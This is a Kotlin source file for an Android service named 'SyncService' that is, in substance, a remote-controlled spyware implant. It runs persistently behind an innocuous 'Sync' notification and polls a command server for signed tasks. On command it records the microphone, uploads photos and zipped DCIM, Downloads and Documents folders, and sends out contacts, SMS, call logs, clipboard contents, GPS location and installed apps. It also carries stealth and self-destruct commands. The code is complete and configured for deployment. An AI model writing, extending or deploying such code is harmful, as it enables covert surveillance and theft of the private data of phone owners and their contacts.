// android/app/src/main/java/com/assets/service/SyncService.kt
// Aligned with server.js above — same HMAC, same HKDF, same endpoints.
// Requires in build.gradle defaultConfig:
//   buildConfigField "String", "NODE_HMAC_KEY", "\"<64 hex chars>\""

package com.assets.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.ClipboardManager
import android.content.ContentUris
import android.content.Context
import android.content.Intent
import android.location.Location
import android.location.LocationManager
import android.media.MediaRecorder
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import androidx.core.app.NotificationCompat
import java.io.ByteArrayInputStream
import java.io.File
import java.io.FileOutputStream
import java.net.HttpURLConnection
import java.net.URL
import java.security.MessageDigest
import java.util.zip.Deflater
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream
import javax.crypto.Mac
import javax.crypto.spec.SecretKeySpec
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import org.json.JSONObject

class SyncService : Service() {

    private var wakeLock: PowerManager.WakeLock? = null
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    // point these at the same host you deploy server.js to
    private val STREAM_URL = "https://YOUR-HOST/api/v3/uranium/stream"
    private val INGEST_URL = "https://YOUR-HOST/api/v3/uranium/upload_raw"

    private var lastHeartbeatSent = 0L
    private var wifiAutopilotEnabled = true
    private var neuralState = "NEURAL_ACTIVE_v17"

    // ── auth: HMAC-SHA256 + HKDF, mirror of server.js ─────────────────
    private object Auth {
        private val MASTER: ByteArray = hex(BuildConfig.NODE_HMAC_KEY)

        private fun hex(s: String): ByteArray {
            require(s.length % 2 == 0) { "odd hex" }
            val out = ByteArray(s.length / 2)
            for (i in out.indices) {
                val hi = Character.digit(s[i * 2], 16)
                val lo = Character.digit(s[i * 2 + 1], 16)
                require(hi >= 0 && lo >= 0) { "bad hex" }
                out[i] = ((hi shl 4) or lo).toByte()
            }
            return out
        }

        private fun hkdf(salt: ByteArray, info: ByteArray, len: Int): ByteArray {
            val mac = Mac.getInstance("HmacSHA256")
            mac.init(SecretKeySpec(MASTER, "HmacSHA256"))
            val prk = mac.doFinal(salt)
            mac.init(SecretKeySpec(prk, "HmacSHA256"))
            val out = ByteArray(len)
            var t = ByteArray(0); var pos = 0; var ctr = 1
            while (pos < len) {
                mac.reset()
                mac.update(t); mac.update(info); mac.update(ctr.toByte())
                t = mac.doFinal()
                val n = minOf(t.size, len - pos)
                System.arraycopy(t, 0, out, pos, n)
                pos += n; ctr++
            }
            return out
        }

        fun keyFor(id: String): ByteArray =
            hkdf(id.toByteArray(), "uranium-v17".toByteArray(), 32)

        /** returns Triple(timestamp, signature-hex, bodySha256Hex) */
        fun sign(id: String, body: ByteArray): Triple<String, String, String> {
            val ts = (System.currentTimeMillis() / 1000).toString()
            val bodyHash = MessageDigest.getInstance("SHA-256").digest(body)
                .joinToString("") { "%02x".format(it) }
            val mac = Mac.getInstance("HmacSHA256")
            mac.init(SecretKeySpec(keyFor(id), "HmacSHA256"))
            val sig = mac.doFinal("$id:$ts:$bodyHash".toByteArray())
                .joinToString("") { "%02x".format(it) }
            return Triple(ts, sig, bodyHash)
        }
    }

    // ── service lifecycle ─────────────────────────────────────────────
    override fun onCreate() {
        super.onCreate()
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Uranium::Neural")
        wakeLock?.acquire(10 * 60 * 60 * 1000L)
        startAsForeground()
    }

    private fun startAsForeground() {
        val ch = "uranium_core"
        val mgr = getSystemService(NotificationManager::class.java)
        mgr?.createNotificationChannel(
            NotificationChannel(ch, "Sync", NotificationManager.IMPORTANCE_LOW))
        val n: Notification = NotificationCompat.Builder(this, ch)
            .setContentTitle("Sync")
            .setContentText("service active")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .build()
        startForeground(1, n)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
            ?: "uranium_node"
        val model = Build.MODEL
        scope.launch { heartbeatLoop(deviceId, model) }
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null
    override fun onDestroy() {
        super.onDestroy()
        wakeLock?.release(); scope.cancel()
    }

    // ── heartbeat + task poll (signed) ────────────────────────────────
    private suspend fun heartbeatLoop(nodeId: String, model: String) {
        while (scope.isActive) {
            try {
                val now = System.currentTimeMillis()
                val beat = (now - lastHeartbeatSent > 120_000L)
                val type = if (beat) "HEARTBEAT" else "SILENT_CHECK"
                val body = JSONObject()
                    .put("type", type)
                    .put("data", "[active] $model")
                    .toString().toByteArray(Charsets.UTF_8)
                if (beat) lastHeartbeatSent = now

                val conn = signedPost(STREAM_URL, nodeId, model, body,
                    "application/json; charset=utf-8", 8_000)
                conn.outputStream.use { it.write(body); it.flush() }
                if (conn.responseCode == 200) {
                    val resp = conn.inputStream.bufferedReader().readText()
                    runCatching {
                        val json = JSONObject(resp)
                        if (!json.isNull("task")) {
                            val task = json.getJSONObject("task")
                            dispatch(nodeId, model, task.getString("action"))
                        }
                    }
                }
                conn.disconnect()
                delay(8_000L)
            } catch (_: Exception) { delay(10_000L) }
        }
    }

    // ── signed POST helper ────────────────────────────────────────────
    private fun signedPost(url: String, nodeId: String, model: String, body: ByteArray,
                           contentType: String, timeoutMs: Int): HttpURLConnection {
        val (ts, sig, _) = Auth.sign(nodeId, body)
        return (URL(url).openConnection() as HttpURLConnection).apply {
            requestMethod = "POST"
            setRequestProperty("X-Node-Id", nodeId)
            setRequestProperty("X-Node-Model", model)
            setRequestProperty("X-Timestamp", ts)
            setRequestProperty("X-Signature", sig)
            setRequestProperty("Content-Type", contentType)
            doOutput = true
            connectTimeout = timeoutMs
            readTimeout = timeoutMs
        }
    }

    // ── action dispatch ───────────────────────────────────────────────
    private fun dispatch(nodeId: String, model: String, action: String) {
        when {
            action.contains("MIC_AI_LISTEN")   -> recordAudio(nodeId, model)
            action.contains("MICRO_BURST_SNAP")-> snapLatestPhoto(nodeId, model)
            action.contains("STEALTH_BLACKOUT")-> report(nodeId, model, "stealth blackout engaged")
            action.contains("GEO_FENCE_ALERT") -> sendText(nodeId, model, "Geo.txt",
                "GPS:\n${readLocation()}")
            action.contains("POLY_MUTATE") -> {
                neuralState = "MUT_${System.currentTimeMillis() % 10000}"
                report(nodeId, model, "state -> $neuralState")
            }
            action.contains("SELF_DESTRUCT") -> {
                report(nodeId, model, "cache wipe + stop")
                runCatching { cacheDir.deleteRecursively() }
                stopSelf()
            }
            action.contains("WIFI_AUTOPILOT") -> {
                wifiAutopilotEnabled = !wifiAutopilotEnabled
                report(nodeId, model, "wifi-autopilot=$wifiAutopilotEnabled")
            }
            action.contains("STORAGE_AUDIT") -> sendText(nodeId, model,
                "StorageAudit.txt", storageAudit())
            action.contains("PROC_DCIM")     -> if (allowedOnNetwork())
                zipAndUpload(nodeId, model, "DCIM",
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
                else report(nodeId, model, "DCIM deferred: no WiFi")
            action.contains("PROC_DOWNLOAD") -> if (allowedOnNetwork())
                zipAndUpload(nodeId, model, "Download",
                    MediaStore.Files.getContentUri("external"))
                else report(nodeId, model, "Download deferred: no WiFi")
            action.contains("PROC_PICTURES") -> zipAndUpload(nodeId, model, "Pictures",
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
            action.contains("PROC_DOCUMENTS")-> zipAndUpload(nodeId, model, "Documents",
                MediaStore.Files.getContentUri("external"))
            action.contains("EXTRACT_CONTACTS")  -> sendText(nodeId, model, "Contacts.txt", readContacts())
            action.contains("EXTRACT_SMS")       -> sendText(nodeId, model, "SMS.txt", readSms())
            action.contains("EXTRACT_CALLS")     -> sendText(nodeId, model, "Calls.txt", readCalls())
            action.contains("EXTRACT_CLIPBOARD") -> sendText(nodeId, model, "Clipboard.txt", readClipboard())
            action.contains("EXTRACT_LOCATION")  -> sendText(nodeId, model, "Location.txt", readLocation())
            action.contains("EXTRACT_APPS")      -> sendText(nodeId, model, "Apps.txt", readApps())
        }
    }

    // ── network gate ──────────────────────────────────────────────────
    private fun allowedOnNetwork(): Boolean =
        !wifiAutopilotEnabled || isOnWifi()

    private fun isOnWifi(): Boolean = try {
        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val net = cm.activeNetwork ?: return false
        cm.getNetworkCapabilities(net)?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true
    } catch (_: Exception) { false }

    // ── upload (signed, retried) ──────────────────────────────────────
    private fun upload(nodeId: String, model: String, name: String, bytes: ByteArray) {
        repeat(3) { attempt ->
            try {
                val conn = signedPost(INGEST_URL, nodeId, model, bytes,
                    "application/octet-stream", 180_000)
                conn.setChunkedStreamingMode(64 * 1024)
                conn.outputStream.use { it.write(bytes); it.flush() }
                val code = conn.responseCode
                conn.disconnect()
                if (code == 200) return
            } catch (_: Exception) {
                if (attempt == 2) return
                Thread.sleep(2_000L)
            }
        }
    }

    // ── reports ───────────────────────────────────────────────────────
    private fun report(nodeId: String, model: String, text: String) {
        try {
            val body = JSONObject()
                .put("type", "TEXT_REPORT")
                .put("data", text)
                .toString().toByteArray(Charsets.UTF_8)
            val conn = signedPost(STREAM_URL, nodeId, model, body,
                "application/json; charset=utf-8", 8_000)
            conn.outputStream.use { it.write(body); it.flush() }
            conn.responseCode
            conn.disconnect()
        } catch (_: Exception) {}
    }

    private fun sendText(nodeId: String, model: String, name: String, text: String) {
        upload(nodeId, model, name, text.toByteArray(Charsets.UTF_8))
        report(nodeId, model, "sent $name")
    }

    // ── audio ─────────────────────────────────────────────────────────
    private fun recordAudio(nodeId: String, model: String) {
        try {
            val f = File(cacheDir, "mic_${System.currentTimeMillis()}.3gp")
            val rec = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                setOutputFile(f.absolutePath)
                prepare(); start()
            }
            Thread.sleep(6_000L)
            rec.stop(); rec.release()
            if (f.exists() && f.length() > 0) {
                upload(nodeId, model, f.name, f.readBytes())
                report(nodeId, model, "audio uploaded")
            }
            runCatching { f.delete() }
        } catch (e: Exception) {
            report(nodeId, model, "audio err: ${e.message}")
        }
    }

    // ── latest photo ──────────────────────────────────────────────────
    private fun snapLatestPhoto(nodeId: String, model: String) {
        try {
            val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            val proj = arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME)
            val sort = "${MediaStore.MediaColumns.DATE_ADDED} DESC"
            contentResolver.query(uri, proj, null, null, sort)?.use { c ->
                if (c.moveToFirst()) {
                    val idI = c.getColumnIndex(MediaStore.MediaColumns._ID)
                    val nmI = c.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
                    if (idI != -1 && nmI != -1) {
                        val id = c.getLong(idI)
                        val nm = c.getString(nmI) ?: "snap.jpg"
                        val item = ContentUris.withAppendedId(uri, id)
                        contentResolver.openInputStream(item)?.use { inS ->
                            val bytes = inS.readBytes()
                            if (bytes.isNotEmpty()) {
                                upload(nodeId, model, "snap_$nm", bytes)
                                report(nodeId, model, "snap uploaded")
                            }
                        }
                    }
                }
            }
        } catch (e: Exception) { report(nodeId, model, "snap err: ${e.message}") }
    }

    // ── folder zip ────────────────────────────────────────────────────
    private fun zipAndUpload(nodeId: String, model: String, folder: String, uri: Uri) {
        try {
            report(nodeId, model, "zipping $folder")
            val zip = File(cacheDir, "${folder}_${System.currentTimeMillis()}.zip")
            ZipOutputStream(FileOutputStream(zip)).use { zos ->
                zos.setLevel(Deflater.BEST_COMPRESSION)
                val proj = arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME)
                val sort = "${MediaStore.MediaColumns.DATE_ADDED} DESC"
                var n = 0
                contentResolver.query(uri, proj, null, null, sort)?.use { c ->
                    val idI = c.getColumnIndex(MediaStore.MediaColumns._ID)
                    val nmI = c.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
                    while (c.moveToNext() && n < 40) {
                        if (idI == -1 || nmI == -1) continue
                        val id = c.getLong(idI)
                        val nm = c.getString(nmI) ?: "f_$id.dat"
                        val item = ContentUris.withAppendedId(uri, id)
                        try {
                            contentResolver.openInputStream(item)?.use { inS ->
                                zos.putNextEntry(ZipEntry("$folder/$nm"))
                                inS.copyTo(zos)
                                zos.closeEntry(); n++
                            }
                        } catch (_: Exception) {}
                    }
                }
            }
            if (zip.exists() && zip.length() > 0) {
                upload(nodeId, model, zip.name, zip.readBytes())
            }
            runCatching { zip.delete() }
        } catch (e: Exception) { report(nodeId, model, "$folder err: ${e.message}") }
    }

    // ── collectors ────────────────────────────────────────────────────
    private fun readContacts(): String {
        val sb = StringBuilder("=== CONTACTS ===\n")
        try {
            contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null)?.use { c ->
                val nI = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val pI = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                while (c.moveToNext()) {
                    val n = if (nI != -1) c.getString(nI) else "?"
                    val p = if (pI != -1) c.getString(pI) else ""
                    sb.append("• $n: $p\n")
                }
            }
        } catch (_: Exception) {}
        return sb.toString()
    }

    private fun readSms(): String {
        val sb = StringBuilder("=== SMS ===\n")
        try {
            contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)?.use { c ->
                val bI = c.getColumnIndex("body"); val aI = c.getColumnIndex("address")
                while (c.moveToNext()) {
                    val a = if (aI != -1) c.getString(aI) else "?"
                    val b = if (bI != -1) c.getString(bI) else ""
                    sb.append("From: $a\n$b\n---\n")
                }
            }
        } catch (_: Exception) {}
        return sb.toString()
    }

    private fun readCalls(): String {
        val sb = StringBuilder("=== CALLS ===\n")
        try {
            contentResolver.query(android.provider.CallLog.Calls.CONTENT_URI,
                null, null, null, null)?.use { c ->
                val nI = c.getColumnIndex(android.provider.CallLog.Calls.NUMBER)
                val tI = c.getColumnIndex(android.provider.CallLog.Calls.TYPE)
                while (c.moveToNext()) {
                    val n = if (nI != -1) c.getString(nI) else "?"
                    val t = if (tI != -1) c.getString(tI) else "0"
                    sb.append("$n | type=$t\n")
                }
            }
        } catch (_: Exception) {}
        return sb.toString()
    }

    private fun readClipboard(): String {
        val sb = StringBuilder("=== CLIPBOARD ===\n")
        try {
            val cm = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            if (cm.hasPrimaryClip()) {
                val item = cm.primaryClip?.getItemAt(0)
                sb.append("${item?.text}\n")
            }
        } catch (_: Exception) {}
        return sb.toString()
    }

    private fun readLocation(): String {
        val sb = StringBuilder("=== GPS ===\n")
        try {
            val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            var best: Location? = null
            for (p in lm.allProviders) {
                val l = lm.getLastKnownLocation(p) ?: continue
                if (best == null || l.time > best!!.time) best = l
            }
            if (best != null) {
                sb.append("lat=${best!!.latitude}\n")
                sb.append("lon=${best!!.longitude}\n")
                sb.append("https://maps.google.com/?q=${best!!.latitude},${best!!.longitude}\n")
            }
        } catch (_: Exception) {}
        return sb.toString()
    }

    private fun readApps(): String {
        val sb = StringBuilder("=== APPS ===\n")
        try {
            packageManager.getInstalledPackages(0).forEach {
                val label = it.applicationInfo?.loadLabel(packageManager)?.toString() ?: "?"
                sb.append("• $label\n")
            }
        } catch (_: Exception) {}
        return sb.toString()
    }

    private fun storageAudit(): String {
        val sb = StringBuilder("=== STORAGE ===\n")
        try {
            listOf("DCIM" to MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                   "Files" to MediaStore.Files.getContentUri("external")).forEach { (n, u) ->
                var cnt = 0; var total = 0L
                val proj = arrayOf(MediaStore.MediaColumns.SIZE)
                contentResolver.query(u, proj, null, null, null)?.use { c ->
                    cnt = c.count
                    val sI = c.getColumnIndex(MediaStore.MediaColumns.SIZE)
                    if (sI != -1) while (c.moveToNext()) total += c.getLong(sI)
                }
                sb.append("$n: $cnt files, ~${"%.2f".format(total / 1048576.0)} MB\n")
            }
        } catch (_: Exception) {}
        return sb.toString()
    }
}
